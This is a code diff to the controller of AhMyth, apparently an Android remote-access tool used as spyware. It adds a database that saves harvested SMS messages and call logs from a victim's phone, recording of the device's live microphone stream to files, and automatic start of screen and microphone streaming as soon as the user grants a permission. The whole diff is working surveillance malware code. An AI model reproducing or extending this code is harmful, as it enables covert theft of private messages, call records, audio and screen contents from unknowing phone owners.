@@ -56,6 +56,19 @@ var dataPath = path.join(homedir(), CONSTANTS.dataDir);
 var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
 var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
 var logPath = path.join(dataPath, 'Logs');
+var db;
+try {
+    // Try to load database module
+    const dbPath = path.resolve(__dirname, '../Database.js');
+    if (fs.existsSync(dbPath)) {
+        db = require(dbPath);
+        console.log('[AhMyth] Database module loaded');
+    } else {
+        console.warn('[AhMyth] Database module not found at:', dbPath);
+    }
+} catch (e) {
+    console.error('[AhMyth] Failed to load database:', e);
+}
 
 // Ensure log directory exists
 if (!fs.existsSync(logPath)) {
@@ -90,6 +103,15 @@ function logToFile(type, command, data) {
     
     // Log to console
     console.log(`[AhMyth ${type}] ${command}:`, dataStr.substring(0, 500));
+    
+    // Log to SQLite DB
+    if (db) {
+        try {
+            db.log(type, command, dataStr.includes('"error"') ? 'FAIL' : 'SUCCESS');
+        } catch (e) {
+            console.error('DB Log Error:', e);
+        }
+    }
     
     // Log to UI Activity Log panel
     if (rootScope && rootScope.Log) {
@@ -375,11 +397,15 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $inte
     // Listen for permission request responses
     socket.on('x0000rp', (data) => {
         if (data.success) {
-            $rootScope.Log(`[✓] Permission request shown: ${data.permission}`, CONSTANTS.logStatus.SUCCESS);
+            $rootScope.Log(`[✓] Permission dialog shown: ${data.permission}`, CONSTANTS.logStatus.SUCCESS);
         } else if (data.error) {
             $rootScope.Log(`[✗] Permission error: ${data.error}`, CONSTANTS.logStatus.FAIL);
-        } else if (data.granted) {
-            $rootScope.Log(`[✓] Permission granted: ${data.permission}`, CONSTANTS.logStatus.SUCCESS);
+        } else if (data.granted === true) {
+            $rootScope.Log(`[✓] Permission GRANTED by user: ${data.permission}`, CONSTANTS.logStatus.SUCCESS);
+            // Broadcast event for controllers to retry action
+            $rootScope.$broadcast('PermissionGranted', data.permission);
+        } else if (data.granted === false) {
+             $rootScope.Log(`[✗] Permission DENIED by user: ${data.permission}`, CONSTANTS.logStatus.FAIL);
         }
         if (!$rootScope.$$phase) {
             $rootScope.$apply();
@@ -913,12 +939,25 @@ app.controller("SMSCtrl", function ($scope, $rootScope) {
             $rootScope.Log(`[✓] SMS list received: ${data.smsList.length} messages`, CONSTANTS.logStatus.SUCCESS);
             $SMSCtrl.smsList = data.smsList;
             $SMSCtrl.smsSize = data.smsList.length;
+            
+            // Save to DB
+            if (db) {
+                try {
+                    db.saveSMS(data.smsList);
+                } catch (e) { console.error(e); }
+            }
+            
             $SMSCtrl.$apply();
         } else {
-            if (data == true)
+            if (data == true) {
                 $rootScope.Log('[✓] SMS sent successfully', CONSTANTS.logStatus.SUCCESS);
-            else
+                // Refresh list to show sent message
+                setTimeout(() => {
+                    $SMSCtrl.getSMSList();
+                }, 1000);
+            } else {
                 $rootScope.Log('[✗] Failed to send SMS', CONSTANTS.logStatus.FAIL);
+            }
         }
     });
 
@@ -988,6 +1027,14 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
             $rootScope.Log(`[✓] Call logs received: ${data.callsList.length} entries`, CONSTANTS.logStatus.SUCCESS);
             $CallsCtrl.callsList = data.callsList;
             $CallsCtrl.logsSize = data.callsList.length;
+            
+            // Save to DB
+            if (db) {
+                try {
+                    db.saveCalls(data.callsList);
+                } catch (e) { console.error(e); }
+            }
+            
             $CallsCtrl.$apply();
         }
     });
@@ -2168,6 +2215,16 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
         `);
     };
     
+    // Auto-retry on permission grant
+    $rootScope.$on('PermissionGranted', (event, permission) => {
+        if (permission.toLowerCase().includes('screen') && $ScreenCtrl.awaitingPermission) {
+            $rootScope.Log('[→] Permission granted! Starting screen stream...', CONSTANTS.logStatus.INFO);
+            $ScreenCtrl.permissionGranted = true;
+            $ScreenCtrl.awaitingPermission = false;
+            $ScreenCtrl.startStream();
+        }
+    });
+
     // ============ Socket Handlers ============
     
     socket.on(screen, (data) => {
@@ -2664,6 +2721,11 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
     var gainNode = null;
     var audioQueue = [];
     var isPlaying = false;
+    
+    // Recording vars
+    var mediaRecorder = null;
+    var recordedChunks = [];
+    var destNode = null;
 
     // Initialize Web Audio API
     function initAudio() {
@@ -2674,10 +2736,69 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
             gainNode = audioContext.createGain();
             gainNode.connect(audioContext.destination);
             gainNode.gain.value = $LiveMicCtrl.volume / 100;
+            
+            // Setup recording destination
+            destNode = audioContext.createMediaStreamDestination();
+            gainNode.connect(destNode);
+            
             $rootScope.Log('[✓] Audio context initialized', CONSTANTS.logStatus.SUCCESS);
         } catch (e) {
             $rootScope.Log(`[✗] Failed to init audio: ${e.message}`, CONSTANTS.logStatus.FAIL);
         }
+    }
+
+    $LiveMicCtrl.startRecording = () => {
+        if (!destNode) return;
+        
+        try {
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(destNode.stream);
+            
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) {
+                    recordedChunks.push(e.data);
+                }
+            };
+            
+            mediaRecorder.onstop = () => {
+                saveRecording();
+            };
+            
+            mediaRecorder.start();
+            $LiveMicCtrl.isRecording = true;
+            $rootScope.Log('[●] Recording started', CONSTANTS.logStatus.INFO);
+        } catch (e) {
+            $rootScope.Log(`[✗] Failed to start recording: ${e.message}`, CONSTANTS.logStatus.FAIL);
+        }
+    };
+
+    $LiveMicCtrl.stopRecording = () => {
+        if (mediaRecorder && $LiveMicCtrl.isRecording) {
+            mediaRecorder.stop();
+            $LiveMicCtrl.isRecording = false;
+            $rootScope.Log('[■] Recording stopped, saving...', CONSTANTS.logStatus.INFO);
+        }
+    };
+
+    function saveRecording() {
+        if (recordedChunks.length === 0) return;
+        
+        const blob = new Blob(recordedChunks, { type: 'audio/webm' });
+        const reader = new FileReader();
+        reader.onload = () => {
+            const buffer = Buffer.from(reader.result);
+            const filename = `LiveMic_${Date.now()}.webm`;
+            const savePath = path.join(downloadsPath, filename);
+            
+            fs.outputFile(savePath, buffer, (err) => {
+                if (err) {
+                    $rootScope.Log(`[✗] Failed to save recording: ${err.message}`, CONSTANTS.logStatus.FAIL);
+                } else {
+                    $rootScope.Log(`[✓] Recording saved: ${savePath}`, CONSTANTS.logStatus.SUCCESS);
+                }
+            });
+        };
+        reader.readAsArrayBuffer(blob);
     }
 
     // Play audio buffer
@@ -2810,6 +2931,14 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
             gainNode.gain.value = $LiveMicCtrl.isMuted ? 0 : $LiveMicCtrl.volume / 100;
         }
     };
+
+    // Auto-retry on permission grant
+    $rootScope.$on('PermissionGranted', (event, permission) => {
+        if ((permission.toLowerCase().includes('mic') || permission.toLowerCase().includes('record')) && !$LiveMicCtrl.isStreaming) {
+             $rootScope.Log('[→] Permission granted! Starting mic stream...', CONSTANTS.logStatus.INFO);
+             $LiveMicCtrl.startStream();
+        }
+    });
 
     socket.on(liveMic, (data) => {
         if (data.audio) {
